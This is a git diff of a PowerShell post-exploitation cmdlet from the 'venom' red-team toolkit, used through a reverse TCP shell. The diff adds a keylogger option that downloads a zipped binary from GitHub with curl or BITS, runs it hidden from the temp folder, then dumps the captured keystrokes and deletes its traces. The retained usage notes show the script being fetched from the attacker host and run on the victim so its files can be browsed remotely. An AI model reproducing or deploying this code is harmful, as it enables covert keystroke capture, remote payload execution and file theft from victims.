@@ -5,8 +5,8 @@
    Author: r00t-3xp10it (SSA RedTeam @2020)
    Tested Under: Windows 10 - Build 18363
    Required Dependencies: python (http.server)
-   Optional Dependencies: curl|BitsTransfer
-   PS cmdlet Dev version: v1.15
+   Optional Dependencies: Curl|BitsTransfer
+   PS cmdlet Dev version: v1.17
 
 .DESCRIPTION
    This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
@@ -16,13 +16,13 @@
    to capture Screenshots of MouseClicks [<-SPsr>] and browser enumeration [<-SEnum>]
    The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell(s)
 
-   1º - Place this cmdlet in attacker machine apache2 webroot
+   1º - Place this cmdlet in attacker apache2 webroot
         cp webserver.ps1 /var/www/html/webserver.ps1
 
-   2º - Then upload webserver using the reverse tcp shell prompt
+   2º - Upload webserver using the reverse tcp shell prompt
         cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1
 
-   3º - Then remote execute webserver using the reverse tcp shell prompt
+   3º - Remote execute webserver using the reverse tcp shell prompt
         powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -SEnum Verbose
 
    4º - In attacker PC access 'http://RHOST:8086/' (web browser) to read/browse/download files.
@@ -71,6 +71,18 @@
    'The minimum capture time its 8 seconds and 100 screenshots max'.
 
 .EXAMPLE
+   PS C:\> .\webserver.ps1 -Keylogger Start
+   Download/Execute void.exe in child process
+   to be abble to capture remote host keystrokes.
+
+.EXAMPLE
+   PS C:\> .\webserver.ps1 -Keylogger Stop
+   Stop keylogger by is process FileName identifier
+   and  delete keylogger and all respective files/logs
+   This parameter can NOT be used together with other parameters
+   because after completing is task (Stop keylogger proc) it exits.
+
+.EXAMPLE
    PS C:\> .\webserver.ps1 -SEnum True
    Remote Host Web Browser Enumeration, DNS Records, DHCP
    User-Agent, Default Browser, TCP Headers, MainWindowTitle
@@ -103,8 +115,7 @@
    None. You cannot pipe objects into webserver.ps1
 
 .OUTPUTS
-   None. This cmdlet does not produce outputs if used -Windowstyle hidden
-   parameter, But if executed without it, it will produce terminal outputs.
+   This cmdlet does not produce outputs if used -WindowStyle hidden parameter.
 
 .LINK
     https://github.com/r00t-3xp10it/venom
@@ -113,10 +124,10 @@
     https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
 #>
 
-
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$SPath="$Env:UserProfile",
+   [string]$Keylogger="False",
    [string]$Sessions="False",
    [string]$Download="False",
    [string]$SEnum="False",
@@ -131,7 +142,7 @@
 )
 
 $HiddeMsgBox = $False
-$CmdletVersion = "v1.15"
+$CmdletVersion = "v1.17"
 $Initial_Path = (pwd).Path
 $Server_hostName = (hostname)
 $Server_Working_Dir = "$SPath"
@@ -158,6 +169,7 @@ $Banner = @"
 "@;
 Clear-Host;
 Write-Host $Banner;
+$MyServer = Get-Process powershell -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
 If($Download -ne "False"){
 $ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
@@ -169,7 +181,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 
    <#
    .SYNOPSIS
-      Downloads one file from remote-host (Curl|BitsTransfer)
+      Download files from apache2 (Curl|BitsTransfer)
 
    .NOTES
       File to Download must be stored in attacker apache2 webroot.
@@ -178,8 +190,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 
    .EXAMPLE
       PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
-      Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
-      webroot to @webserver.ps1 remote working directory.
+      Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73).
    #>
 
    Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor Green;Start-Sleep -Seconds 1
@@ -204,9 +215,9 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
    }
 
-   If(-not($FileName -Match '.exe')){## This test does not work on binary files (.exe)
+   If(-not($FileName -iMatch '.exe')){## This test does not work on binary files (.exe)
       $Status = Get-Content -Path "$Initial_Path\$FileName"
-      If($Status -Match '<!DOCTYPE html' -or $Status -Match '^[<]'){## Make sure that the download file its not a 'DOCTYPE html' document
+      If($Status -iMatch '<!DOCTYPE html'){## Make sure that the download file its not a 'DOCTYPE html' document
          Start-Sleep -Seconds 1;Write-Host "[abort] $FileName download corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }
@@ -404,6 +415,104 @@ If($SPsr -lt '8'){$SPsr = '10'} # Set the minimum capture time value
    }
 }
 
+If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
+$Timer = Get-Date -Format 'HH:mm:ss'
+
+   <#
+   .SYNOPSIS
+      Capture remote host keystrokes ($Env:TMP)
+
+   .EXAMPLE
+      PS C:\> .\webserver.ps1 -Keylogger Start
+      Download/Execute void.exe in child process
+
+   .EXAMPLE
+      PS C:\> .\webserver.ps1 -Keylogger Stop
+      Stop keylogger by is process FileName identifier
+      and delete keylogger and all respective files/logs
+   #>
+
+   If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
+      write-host "Capture $Server_hostName keystrokes." -ForeGroundColor Green;Start-Sleep -Seconds 1
+      cmd /c curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -o %tmp%\void.zip -u SSARedTeam:s3cr3t
+
+      ## Check for Failed/Corrupted downloads
+      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
+      If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void using curl.exe
+         Write-Host "[fail] to download void.zip using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
+         Start-Sleep -Milliseconds 600;Write-Host "Trying to download void.zip Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
+         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -Destination $Env:TMP\void.zip -ErrorAction SilentlyContinue|Out-Null
+
+         ## Check for Failed/Corrupted downloads
+         $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
+         If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void.zip using BitsTransfer (BITS)
+            Write-Host "[fail] to download void.zip using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black
+            If(Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue){Remove-Item -Path "$Env:TMP\void.zip" -Force}
+            Start-Sleep -Milliseconds 600;Write-Host "[abort] keylogger remote execution .." -ForeGroundColor Yellow
+            Start-Sleep -Seconds 1;write-host ""       
+         }
+      }
+
+      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
+      $KeyPath = Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue
+      If($KeyPath -ieq "True" -and $SizeDump -gt 36){
+         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
+         ## De-Compress Keylogger Archive files into $env:TMP remote directory
+         Expand-Archive -Path "$Env:TMP\void.zip" -DestinationPath "$Env:TMP\void" -Force -ErrorAction SilentlyContinue|Out-Null
+         Move-Item $Env:TMP\void\void.exe $Env:TMP\void.exe -Force -EA SilentlyContinue
+         Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
+         Remove-Item -Path "$Env:TMP\void.zip" -Force
+
+         ## Start void.exe in an orphan process
+         Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
+         Start-Sleep -Seconds 2;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
+
+            ## Create Data Table for output
+            $mytable = New-Object System.Data.DataTable
+            $mytable.Columns.Add("PID")|Out-Null
+            $mytable.Columns.Add("StartTime")|Out-Null
+            $mytable.Columns.Add("ProcessName")|Out-Null
+            $mytable.Columns.Add("LogFile")|Out-Null
+            $mytable.Rows.Add("$PIDS","$KeyLoggerTimer","void.exe","$Env:TMP\void.log")|Out-Null
+
+         ## Display Data Table
+         $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
+         Get-Content -Path "$Env:TMP\KeyDump.log"
+         Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
+      }
+   }
+
+
+   If($Keylogger -ieq 'Stop'){
+      ## Dump captured keystrokes
+      # Stops process and Delete files/logs
+      Write-Host "Captured keystrokes"
+      Write-Host "-------------------" -ForegroundColor DarkGreen
+      If(Test-Path -Path "$Env:TMP\void.log"){
+         Get-Content -Path "$Env:TMP\void.log"
+      }
+      Write-Host ""
+      write-host "Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
+      $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
+
+      If($IDS){## keylogger process found
+         taskkill /F /IM void.exe|Out-Null
+         If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
+            write-host "Keylogger PID $IDS process successfuly stoped.`n" -ForeGroundColor Green
+         }Else{
+            write-host "[fail] to terminate keylogger PID process" -ForeGroundColor Red -BackgroundColor Black
+            write-host ""
+         }
+      }Else{
+         write-host "[fail] keylogger process PID not found" -ForeGroundColor Red -BackgroundColor Black
+         write-host ""
+      }
+      ## Clean old files
+      Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
+      Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
+      Start-Sleep -Milliseconds 600;exit ## exit @webserver
+   }
+}
 
 $PythonVersion = cmd /c python --version
 If(-not($PythonVersion) -or $PythonVersion -ieq $null){
@@ -517,7 +626,7 @@ $Installation = cmd /c python --version
 ## Make Sure python http.server requirement its satisfied.
 If(-not($Installation) -or $Installation -ieq $null){
    write-host "[Abort] This cmdlet cant find python installation." -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
-   write-host "[Force] the installation of python: .\webserver.ps1 -SForce 10 -STime 26 -SEnum True" -ForeGroundColor Yellow;write-host "";Start-Sleep -Seconds 2
+   write-host "[Force] the installation of python: .\webserver.ps1 -SForce 10 -STime 26 -SEnum Verbose" -ForeGroundColor Yellow;write-host "";Start-Sleep -Seconds 2
    exit ## Exit @webserver
 
 }Else{
@@ -614,7 +723,7 @@ If(-not($Installation) -or $Installation -ieq $null){
       $OsVersion = (Get-WmiObject Win32_OperatingSystem).Version
       $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
       $recon_age = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
-      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");If($IsClientAdmin){$report = "Administrator"}Else{$report = "UserLand"}
+      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");If($IsClientAdmin){$report = "Administrator"}Else{$report = "UserLand"}
       $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
       If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
       $BrowserPath = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty Path
